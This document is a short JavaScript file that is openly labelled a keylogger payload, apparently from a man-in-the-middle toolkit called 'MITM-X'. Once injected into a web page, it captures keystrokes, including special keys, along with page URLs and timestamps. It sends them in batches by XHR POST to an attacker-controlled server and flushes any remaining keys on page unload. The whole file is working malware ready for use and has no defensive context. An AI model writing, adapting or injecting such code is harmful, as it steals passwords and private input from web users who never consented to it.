// Keylogger Payload - Captures keystrokes and sends to attacker server
(function(){
    var keys = [];
    var attackerServer = 'http://192.168.1.100:8080'; // Change to your server
    
    document.addEventListener('keypress', function(e) {
        keys.push({
            key: String.fromCharCode(e.which),
            timestamp: new Date().toISOString(),
            url: window.location.href
        });
        
        // Send keys when buffer reaches 50 characters
        if (keys.length > 50) {
            sendKeys();
        }
    });
    
    // Also capture special keys
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === 'Tab' || e.key === 'Backspace') {
            keys.push({
                key: '[' + e.key + ']',
                timestamp: new Date().toISOString(),
                url: window.location.href
            });
        }
    });
    
    function sendKeys() {
        if (keys.length === 0) return;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', attackerServer + '/keylog', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            keys: keys,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        }));
        
        keys = []; // Clear buffer
    }
    
    // Send remaining keys before page unload
    window.addEventListener('beforeunload', function() {
        if (keys.length > 0) {
            sendKeys();
        }
    });
    
    console.log('MITM-X Keylogger active');
})();
